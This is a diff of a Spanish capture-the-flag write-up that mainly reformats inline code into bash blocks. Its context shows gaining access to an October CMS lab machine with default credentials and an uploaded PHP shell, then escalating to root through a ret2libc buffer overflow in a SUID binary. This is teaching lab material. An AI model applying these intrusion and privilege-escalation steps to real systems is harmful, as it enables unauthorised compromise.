@@ -64,13 +64,21 @@ Vemos que estamos en frente de un October CMS - Vanilla.
 #### Checkear la web del puerto 80 {-}
 
 Con firefox navigamos en la web para ver lo que es. El Wappalyzer nos confirma que estamos contra un October CMS y Laravel.
-Como es un gestor de contenido buscamos en google la routa del admin panel y vemos que esta en `/backend`.
+Como es un gestor de contenido buscamos en google la routa del admin panel y vemos que esta en 
+```bash
+ /backend 
+```
+.
 
 ## Vulnerability Assessment {-}
 
 ### Checkeando vulnerabilidades para October CMS {-}
 
-En el panel de login, probamos `admin-admin` y entramos en el panel de administracion.
+En el panel de login, probamos 
+```bash
+ admin-admin 
+```
+ y entramos en el panel de administracion.
 
 ;)
 ## Vuln exploit & Gaining Access {-}
@@ -79,7 +87,11 @@ En el panel de login, probamos `admin-admin` y entramos en el panel de administr
 
 Navigando en la web vemos que hay un fichero .php5 y un boton que nos lleva al fichero
 
-decidimos crearnos un fichero `.php` y subirlo
+decidimos crearnos un fichero 
+```bash
+ .php 
+```
+ y subirlo
 
 ```bash
 vi shell.php5
@@ -122,7 +134,11 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-Dandole a `cd /home` vemos que hay un usuario harry que contiene el **user.txt** y podemos ver la flag
+Dandole a 
+```bash
+ cd /home 
+```
+ vemos que hay un usuario harry que contiene el **user.txt** y podemos ver la flag
 ## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
@@ -137,7 +153,11 @@ uname -a
 find \-perm -4000 2>/dev/null
 ```
 
-Aqui vemos un binario interesante `./usr/local/bin/ovrflw`
+Aqui vemos un binario interesante 
+```bash
+ ./usr/local/bin/ovrflw 
+```
+
 
 Lanzamos el binario y vemos que nos pide un input string.
 
@@ -199,7 +219,15 @@ wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA
 A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
 ```
 
-Si le damos a `p $eip` ya sabemos que es el valor del eip en este caso `0x41384141`. Ya podemos calcular el offset.
+Si le damos a 
+```bash
+ p $eip 
+```
+ ya sabemos que es el valor del eip en este caso 
+```bash
+ 0x41384141 
+```
+. Ya podemos calcular el offset.
 
 ```bash
 pattern_offset 0x41384141
@@ -213,7 +241,11 @@ Lo comprobamos poniendo 112 A y 4 B.
 > r $(python -c 'print "A"*112 + "B"*4)
 ```
 
-Aqui ya vemos que el EIP vale `0x42424242` que son 4 B en hexadecimal
+Aqui ya vemos que el EIP vale 
+```bash
+ 0x42424242 
+```
+ que son 4 B en hexadecimal
 
 #### Buscando la direccion despues del registro EIP {-}
 
@@ -247,7 +279,11 @@ ldd /usr/local/bin/ovrflw
     /lib/ld-linux.so.2
 ```
 
-Aqui la libreria `libc.so` esta interesante porque nos permitiria ejecutar commandos a nivel de systema. Y si recordamos bien,
+Aqui la libreria 
+```bash
+ libc.so 
+```
+ esta interesante porque nos permitiria ejecutar commandos a nivel de systema. Y si recordamos bien,
 el binario ovrflw tiene permisos SUID.
 
 ```bash
@@ -257,7 +293,11 @@ ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'
 ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'
 ```
 
-Aqui vemos la direccion de la libreria `0xb758a000`
+Aqui vemos la direccion de la libreria 
+```bash
+ 0xb758a000 
+```
+
 
 Miramos si la direccion cambia a cada ejecucion
 
@@ -265,7 +305,11 @@ Miramos si la direccion cambia a cada ejecucion
 for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
 ```
 
-Aqui vemos que la direccion esta cambiando. Pero si cojemos una de la direcciones por ejemplo la `0xb75e7000` y la grepeamos
+Aqui vemos que la direccion esta cambiando. Pero si cojemos una de la direcciones por ejemplo la 
+```bash
+ 0xb75e7000 
+```
+ y la grepeamos
 al bucle
 
 ```bash
@@ -360,8 +404,16 @@ if __name__ == '__main__':
 
 En este script podemos ver que el valor que queremos dar al EIP es el **ret2libc** (system address + exit address + /bin/sh address).
 
-Si lanzamos el script `python3 exploit.py`, va a tardar un poco. Tardara finalmente el tiempo que la direccion de la libreria libc sea la misma 
+Si lanzamos el script 
+```bash
+ python3 exploit.py 
+```
+, va a tardar un poco. Tardara finalmente el tiempo que la direccion de la libreria libc sea la misma 
 que la que hemos puesto en el script.
 
-Ya vemos que nos entabla un /bin/sh y `whoami` -> root.
+Ya vemos que nos entabla un /bin/sh y 
+```bash
+ whoami 
+```
+ -> root.
 
